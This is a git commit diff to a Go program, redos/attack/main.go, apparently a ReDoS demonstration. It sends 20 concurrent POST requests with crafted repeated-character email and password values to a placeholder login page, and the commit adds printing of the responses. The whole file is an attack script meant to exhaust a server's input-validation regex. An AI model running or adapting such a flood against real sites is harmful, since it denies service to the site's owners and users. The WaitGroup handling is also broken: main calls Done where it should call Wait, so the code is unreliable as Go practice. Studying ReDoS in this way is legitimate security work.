7b5366ae1dec1ecbf44ea56791b909bcd9814039
zhangxinyue <xinyuez018@gmail.com>
2020-03-21 17:10:34 +0800

    add print

--- redos/attack/main.go
+++ redos/attack/main.go
@@ -1,24 +1,37 @@
 package main
 
 import (
+	"fmt"
+	"io/ioutil"
 	"log"
 	"net/http"
 	"net/url"
+	"sync"
 )
+
+var wg sync.WaitGroup
 
 func main() {
 	requestUrl := "http://someip.com/final/index.php"
 	concurrentRequester := 20
 	for i := 0; i < concurrentRequester; i++ {
+		wg.Add(1)
 		go func() {
 			formValue := url.Values{
 				"email":    {"aaaaaaaaaaaa"},
 				"password": {"aaaaaaaaaaaa"},
 			}
-			_, err := http.PostForm(requestUrl, formValue)
+			response, err := http.PostForm(requestUrl, formValue)
 			if err != nil {
 				log.Println(err.Error())
+			}else{
+				defer response.Body.Close()
+				body, _ := ioutil.ReadAll(response.Body)
+				fmt.Println(string(body))
 			}
+			wg.Done()
 		}()
 	}
+	wg.Done()
+	fmt.Println("done")
 }
